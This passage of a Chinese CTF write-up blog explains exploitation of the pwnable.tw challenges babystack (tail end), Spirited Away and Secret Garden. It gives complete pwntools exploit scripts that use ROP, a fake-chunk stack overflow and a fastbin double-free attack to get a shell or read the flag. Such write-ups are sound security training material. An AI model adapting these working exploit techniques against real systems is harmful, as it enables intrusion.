flat(<span class="built_in">map</span>(p64,[</span><br><span class="line">    pop_rdi, puts_got, puts_plt,</span><br><span class="line">    init_pop, <span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">0x100</span>, bss, <span class="number">0</span>,</span><br><span class="line">    init_mov, <span class="number">0</span>, <span class="number">0</span>, bss-<span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    pop_rbp, bss-<span class="number">8</span>, leave_ret</span><br><span class="line">]))</span><br><span class="line">r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">r.recv(timeout=<span class="number">10</span>)</span><br><span class="line">r.recv(timeout=<span class="number">10</span>)</span><br><span class="line">r.sendline(p64(code_base)+<span class="string">&#x27;a&#x27;</span>*<span class="number">24</span>+payload2)</span><br><span class="line">libc_base = u64(r.recv().replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x6f690</span>  <span class="comment"># .</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[LEAK] libc_base -&gt; &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">libc_system = libc_base + <span class="number">0x45390</span>  <span class="comment"># .</span></span><br><span class="line"></span><br><span class="line">payload3 = flat(<span class="built_in">map</span>(p64,[</span><br><span class="line">    pop_rdi, bss+<span class="number">8</span>*<span class="number">3</span>, libc_system</span><br><span class="line">]))</span><br><span class="line"><span class="comment">#payload3 += &#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload3 += <span class="string">&#x27;/bin/cat /home/babystack/flag\x00&#x27;</span></span><br><span class="line"><span class="comment">#raw_input(&#x27;#&#x27;)</span></span><br><span class="line">r.sendline(payload3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure>
<p>(这应该是我跑得最久的exp了 - -)</p>
<h1>Spirited Away</h1>
<p>一道看似是堆题的栈溢出题(而且canary也是关的)，是一个写影评的程序(?)，只有一个函数，漏洞就是在survey函数中输出已经有多少条评论时用到了sprintf函数，由于buf大小是56bytes，如果cnt是三位数的话会造成buf溢出了一位，刚好会把’n’覆盖到name和comment读入时设定的大小的那个变量(叫它nclen吧- -)，所以name和comment的输入大小从60变成了110，造成了栈上的溢出。</p>
<img src="/p/pwnable-tw-writeup/14-1.png" class="" title="img_14-1">
<p>另外，刚开始时由于comment和reason(就是放评论和原因的那两个变量)在栈上，而且输入的时候末尾没有设置0，巧妙利用一下可以泄露栈地址和libc基址。在comment溢出后，可以覆盖到name的指针前泄露heap基址(虽然后来发现这个没什么用- -)。</p>
<p>由于reason的读入大小是由另一个变量控制的，所以不能直接控制reason溢出(reason是最后一个，溢出才能覆盖返回地址)，因为栈地址可以泄露出来，所以想到可以在reason里造一个假堆块，然后覆盖name指针到这个假块，最后free-malloc就把name变到reason里了，由于name的读入大小也改了，所以读入name就可以造成stack overflow。给了库其实可以直接one_gadget的，但远程泄露libc_base时被坑了一下，栈上选了几个才能用，还以为是one_gadget出问题了，才搞了普通ROP(- -)。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10204</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">survey</span>(<span class="params">name, age, reason, comment</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Please enter your name: &#x27;</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Please enter your age: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(age))</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Why did you came to see this movie? &#x27;</span>)</span><br><span class="line">    r.sendline(reason)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Please enter your comment: &#x27;</span>)</span><br><span class="line">    r.sendline(comment)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">another</span>(<span class="params">ans</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Would you like to leave another comment? &lt;y/n&gt;: &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> ans:</span><br><span class="line">        r.sendline(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r.sendline(<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">survey(<span class="string">&#x27;tover&#x27;</span>, <span class="number">1</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">31</span>, <span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;aaaa\n&#x27;</span>)</span><br><span class="line">libc_base = u32(r.recv(<span class="number">4</span>)) - <span class="number">0x1b0d60</span>  <span class="comment"># . (_IO_2_1_stdout_)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[LEAK] libc_base -&gt; &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">another(<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">survey(<span class="string">&#x27;tover&#x27;</span>, <span class="number">0</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">55</span>, <span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;aaaa\n&#x27;</span>)</span><br><span class="line">stack_reason = u32(r.recv(<span class="number">4</span>)) - <span class="number">0x70</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[LEAK] stack_reason -&gt; &#x27;</span>+<span class="built_in">hex</span>(stack_reason))</span><br><span class="line">another(<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">98</span>):</span><br><span class="line">    survey(<span class="string">&#x27;tover\x00&#x27;</span>, <span class="number">0</span>, <span class="string">&#x27;test\x00&#x27;</span>, <span class="string">&#x27;test\x00&#x27;</span>)</span><br><span class="line">    another(<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">10</span>==<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[INFO] &#x27;</span>+<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">survey</span>(<span class="params">name, reason, comment</span>):</span>  <span class="comment"># enmm</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Please enter your name: &#x27;</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Why did you came to see this movie? &#x27;</span>)</span><br><span class="line">    r.sendline(reason)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Please enter your comment: &#x27;</span>)</span><br><span class="line">    r.sendline(comment)</span><br><span class="line"></span><br><span class="line">survey(<span class="string">&#x27;tover\x00&#x27;</span>, <span class="string">&#x27;aaa&#x27;</span>, <span class="string">&#x27;b&#x27;</span>*<span class="number">83</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;bbbb\n&#x27;</span>)</span><br><span class="line">heap_base = u32(r.recv(<span class="number">4</span>)) - <span class="number">0x410</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[LEAK] heap_base -&gt; &#x27;</span>+<span class="built_in">hex</span>(heap_base))  <span class="comment"># enmm no use</span></span><br><span class="line">another(<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">survey2</span>(<span class="params">name, reason, comment</span>):</span>  <span class="comment"># enmm</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Please enter your name: &#x27;</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Why did you came to see this movie? &#x27;</span>)</span><br><span class="line">    r.send(reason)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Please enter your comment: &#x27;</span>)</span><br><span class="line">    r.sendline(comment)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># fake_chunk on reason -&gt; stack overflow</span></span><br><span class="line">fake_chunk = p32(<span class="number">0</span>)*<span class="number">3</span>+p32(<span class="number">0x41</span>)+p32(<span class="number">0</span>)*<span class="number">15</span>+p32(<span class="number">0x41</span>)</span><br><span class="line">survey2(<span class="string">&#x27;tover\x00&#x27;</span>, fake_chunk, <span class="string">&#x27;b&#x27;</span>*<span class="number">84</span>+p32(stack_reason+<span class="number">4</span>*<span class="number">4</span>))</span><br><span class="line">another(<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">one_gadget = libc_base+<span class="number">0x5f065</span>  <span class="comment"># .</span></span><br><span class="line">libc_system = libc_base+<span class="number">0x3a940</span></span><br><span class="line">payload = flat(<span class="built_in">map</span>(p32,[</span><br><span class="line">    libc_system, <span class="number">0xdeadbeef</span>, stack_reason+<span class="number">84</span>+<span class="number">4</span>*<span class="number">3</span></span><br><span class="line">]))</span><br><span class="line">payload += <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">survey(<span class="string">&#x27;d&#x27;</span>*<span class="number">68</span>+payload, <span class="string">&#x27;aaa&#x27;</span>, <span class="string">&#x27;bbb&#x27;</span>)</span><br><span class="line"><span class="comment">#raw_input(&#x27;#&#x27;)</span></span><br><span class="line">another(<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure>
<h1>Secret Garden</h1>
<p>堆题。在remove那里free掉name后没有置0，所以可以造成double free，感觉做法应该不唯一，我用的是fastbin attack的做法。</p>
<p>首先fastbin attack可以泄露堆地址，再来一个unsortedbin或smallbin的可以泄露libc基址，用fastbin attack可以改掉堆上某个flower的name指针，造成任意位置的读，可以读libc上environ的stack地址，然后读栈上的内容就可以读到各种东西了。最后在raise函数的栈里找个合适的地方，malloc一个fastbin大小的块就可以造成栈溢出覆盖返回地址，然后one_gadget get shell。</p>
<p>还有，由于用的时libc2.23，找大小时可以错位，由于64位程序的栈地址和libc地址开头都是0x7f，所以选择大小时0x70的块最合适，还有chunk的大小是int类型的，所以看4个bytes就好了，实际操作中发现想写的地方最后一个byte是随机的，需要一点运气才能跑出来，反正就是不知道怎么的就搞出来了 - -</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment">#env = &#123;&#x27;LD_LIBRARY_PATH&#x27;:&#x27;.&#x27;&#125;</span></span><br><span class="line">        <span class="comment">#r = process(&#x27;./secretgarden&#x27;,env=env)</span></span><br><span class="line">        <span class="comment">#gdb.attach(r)</span></span><br><span class="line">        r = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10203</span>)</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">do_raise</span>(<span class="params">nlen, name, color</span>):</span></span><br><span class="line">            r.recvuntil(<span class="string">&#x27;Your choice : &#x27;</span>)</span><br><span class="line">            r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">            r.recvuntil(<span class="string">&#x27;Length of the name :&#x27;</span>)</span><br><span class="line">            r.sendline(<span class="built_in">str</span>(nlen))</span><br><span class="line">            r.recvuntil(<span class="string">&#x27;The name of flower :&#x27;</span>)</span><br><span class="line">            r.sendline(name)</span><br><span class="line">            r.recvuntil(<span class="string">&#x27;The color of the flower :&#x27;</span>)</span><br><span class="line">            r.sendline(color)</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">do_visit</span>():</span></span><br><span class="line">            r.recvuntil(<span class="string">&#x27;Your choice : &#x27;</span>)</span><br><span class="line">            r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">do_remove</span>(<span class="params">index</span>):</span></span><br><span class="line">            r.recvuntil(<span class="string">&#x27;Your choice : &#x27;</span>)</span><br><span class="line">            r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">            r.recvuntil(<span class="string">&#x27;Which flower do you want to remove from the garden:&#x27;</span>)</span><br><span class="line">            r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">do_clean</span>():</span></span><br><span class="line">            r.recvuntil(<span class="string">&#x27;Your choice : &#x27;</span>)</span><br><span class="line">            r.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">do_leave</span>():</span></span><br><span class="line">            r.recvuntil(<span class="string">&#x27;Your choice : &#x27;</span>)</span><br><span class="line">            r.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        do_raise(<span class="number">0x100</span>, <span class="string">&#x27;ccc&#x27;</span>, <span class="string">&#x27;CCC&#x27;</span>)</span><br><span class="line">        do_raise(<span class="number">0x10</span>, <span class="string">&#x27;ddd&#x27;</span>, <span class="string">&#x27;DDD&#x27;</span>)</span><br><span class="line">        do_raise(<span class="number">0x100</span>, <span class="string">&#x27;eee&#x27;</span>, <span class="string">&#x27;EEE&#x27;</span>)</span><br><span class="line">        do_raise(<span class="number">0x10</span>, <span class="string">&#x27;fff&#x27;</span>, <span class="string">&#x27;FFF&#x27;</span>)</span><br><span class="line">        do_remove(<span class="number">0</span>)</span><br><span class="line">        do_remove(<span class="number">2</span>)</span><br><span class="line">        do_raise(<span class="number">0x100</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;C&#x27;</span>)</span><br><span class="line">        do_visit()</span><br><span class="line">        r.recvuntil(<span class="string">&#x27;Name of the flower[4] :\n&#x27;</span>)</span><br><span class="line">        libc_base = u64(<span class="string">&#x27;\x00&#x27;</span>+r.recv(<span class="number">5</span>)+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">2</span>) - <span class="number">0x3c3c00</span>  <span class="comment"># .</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[LEAK] libc_base -&gt; &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">        do_clean()</span><br><span class="line">        do_raise(<span class="number">0x68</span>, <span class="string">&#x27;aaa&#x27;</span>, <span class="string">&#x27;AAA&#x27;</span>)</span><br><span class="line">        do_raise(<span class="number">0x68</span>, <span class="string">&#x27;bbb&#x27;</span>, <span class="string">&#x27;BBB&#x27;</span>)</span><br><span class="line">        do_remove(<span class="number">0</span>)</span><br><span class="line">        do_remove(<span class="number">2</span>)</span><br><span class="line">        do_remove(<span class="number">0</span>)</span><br><span class="line">        do_raise(<span class="number">0x68</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">        do_visit()</span><br><span class="line">        r.recvuntil(<span class="string">&#x27;Name of the flower[5] :\n&#x27;</span>)</span><br><span class="line">        heap_base = u64(<span class="string">&#x27;\x00&#x27;</span>+r.recv(<span class="number">5</span>)+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">2</span>) - <span class="number">0x1000</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[LEAK] heap_base -&gt; &#x27;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">        do_raise(<span class="number">0x68</span>, <span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span>*<span class="number">11</span>+p64(<span class="number">0x71</span>), <span class="string">&#x27;GGG&#x27;</span>)</span><br><span class="line">        do_raise(<span class="number">0x68</span>, <span class="string">&#x27;hhh&#x27;</span>, <span class="string">&#x27;HHH&#x27;</span>)</span><br><span class="line">        do_remove(<span class="number">6</span>)</span><br><span class="line">        do_remove(<span class="number">7</span>)</span><br><span class="line">        do_remove(<span class="number">6</span>)</span><br><span class="line">        do_raise(<span class="number">0x68</span>, p64(heap_base+<span class="number">0x1140</span>), <span class="string">&#x27;G&#x27;</span>)</span><br><span class="line">        do_raise(<span class="number">0x68</span>, p64(heap_base+<span class="number">0x1140</span>), <span class="string">&#x27;G&#x27;</span>)</span><br><span class="line">        do_raise(<span class="number">0x68</span>, p64(heap_base+<span class="number">0x1140</span>), <span class="string">&#x27;G&#x27;</span>)</span><br><span class="line">        libc_environ = libc_base + <span class="number">0x3c5f38</span>  <span class="comment"># .</span></span><br><span class="line">        fake_chunk = p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)+p64(<span class="number">1</span>)+p64(libc_environ)+<span class="string">&#x27;LEAK_STACK&#x27;</span></span><br><span class="line">        do_raise(<span class="number">0x68</span>, fake_chunk, <span class="string">&#x27;G&#x27;</span>)</span><br><span class="line">        do_visit()</span><br><span class="line">        r.recvuntil(<span class="string">&#x27;Name of the flower[1] :&#x27;</span>)</span><br><span class="line">        stack_main_ret = u64(r.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">2</span>) - <span class="number">0xf0</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[LEAK] stack_main_ret -&gt; &#x27;</span>+<span class="built_in">hex</span>(stack_main_ret))</span><br><span class="line"></span><br><span class="line">        do_remove(<span class="number">8</span>)</span><br><span class="line">        do_remove(<span class="number">9</span>)</span><br><span class="line">        do_remove(<span class="number">8</span>)</span><br><span class="line">        canary_pos = stack_main_ret-<span class="number">0x1f</span></span><br><span class="line">        do_raise(<span class="number">0x68</span>, p64(heap_base+<span class="number">0x1140</span>), <span class="string">&#x27;I&#x27;</span>)</span><br><span class="line">        do_raise(<span class="number">0x68</span>, p64(heap_base+<span class="number">0x1140</span>), <span class="string">&#x27;I&#x27;</span>)</span><br><span class="line">        do_raise(<span class="number">0x68</span>, p64(heap_base+<span class="number">0x1140</span>), <span class="string">&#x27;I&#x27;</span>)</span><br><span class="line">        fake_chunk = p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)+p64(<span class="number">1</span>)+p64(canary_pos)+<span class="string">&#x27;FXXK_CANARY\x00&#x27;</span></span><br><span class="line">        do_raise(<span class="number">0x68</span>, fake_chunk, <span class="string">&#x27;I&#x27;</span>)</span><br><span class="line">        do_visit()</span><br><span class="line">        r.recvuntil(<span class="string">&#x27;Name of the flower[1] :&#x27;</span>)</span><br><span class="line">        canary = <span class="string">&#x27;\x00&#x27;</span>+r.recv(<span class="number">7</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[LEAK] canary -&gt; &#x27;</span>+canary.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        do_remove(<span class="number">14</span>)</span><br><span class="line">        do_remove(<span class="number">13</span>)</span><br><span class="line">        do_remove(<span class="number">14</span>)</span><br><span class="line">        fake_pos = stack_main_ret-<span class="number">0x4b</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[TEST] fake_pos -&gt; &#x27;</span>+<span class="built_in">hex</span>(fake_pos))</span><br><span class="line">        <span class="keyword">if</span> fake_pos&amp;<span class="number">0xff</span> != <span class="number">0xdd</span>:</span><br><span class="line">            r.close()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#gdb.attach(r)</span></span><br><span class="line">        do_raise(<span class="number">0x68</span>, p64(fake_pos), <span class="string">&#x27;J&#x27;</span>)</span><br><span class="line">        do_raise(<span class="number">0x68</span>, p64(fake_pos), <span class="string">&#x27;J&#x27;</span>)</span><br><span class="line">        do_raise(<span class="number">0x68</span>, p64(fake_pos), <span class="string">&#x27;J&#x27;</span>)</span><br><span class="line">        <span class="comment">#fake_chunk = &#x27;a&#x27;*11+p64(0xdeadbeef)</span></span><br><span class="line">        one_gadget = libc_base+<span class="number">0xef6c4</span></span><br><span class="line">        fake_chunk = <span class="string">&#x27;a&#x27;</span>*<span class="number">11</span>+p64(one_gadget)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#raw_input(&#x27;#&#x27;)</span></span><br><span class="line">        do_raise(<span class="number">0x68</span>, fake_chunk, <span class="string">&#x27;I&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        r.interactive()</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
<h2 id="才搞了十五题，还是太菜了啊">才搞了十五题，还是太菜了啊</h2>
<h2 id="流下没技术的眼泪-jpg">流下没技术的眼泪.jpg</h2>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Tover. L</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://tover.xyz/p/pwnable-tw-writeup/">https://tover.xyz/p/pwnable-tw-writeup/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://tover.xyz" target="_blank">Tover' Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PWN/">PWN</a></div><div class="post_share"><div class="social-share" data-image="/../img/cai2.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/p/kernel-pwn/"><img class="prev-cover" src="/../img/cai2.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">内核PWN入坑指南</div></div></a></div><div class="next-post pull-right"><a href="/p/strings-and-memory/"><img class="next-cover" src="/../img/cai2.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">【科普】 那些放在不同位置的字符串</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/p/about-gdb/" title="水一水GDB调试器的用法（入门+进阶）"><img class="cover" src="/../img/cai2.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-03-04</div><div class="title">水一水GDB调试器的用法（入门+进阶）</div></div></a></div><div><a href="/p/kernel-pwn/" title="内核PWN入坑指南"><img class="cover" src="/../img/cai2.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-11-19</div><div class="title">内核PWN入坑指南</div></div></a></div><div><a href="/p/libc-compile/" title="编译带debug_info的glibc"><img class="cover" src="/../img/cai2.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-08-21</div><div class="title">编译带debug_info的glibc</div></div></a></div><div><a href="/p/shellcode/" title="shellcode与shellcode生成"><img class="cover" src="/../img/cai2.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-09-03</div><div class="title">shellcode与shellcode生成</div></div></a></div><div><a href="/p/pwnable-tw-writeup-v2/" title="pwnable.tw部分writeup(不定期更新)_Vol.2"><img class="cover" src="/../img/cai2.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-01-16</div><div class="title">pwnable.tw部分writeup(不定期更新)_Vol.2</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="gitalk-container"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Tover. L</div><div class="author-info__description">二进制是密码学人的自我修养 =v=</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">49</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">13</div></a></div></div><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/ToverPomelo" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" 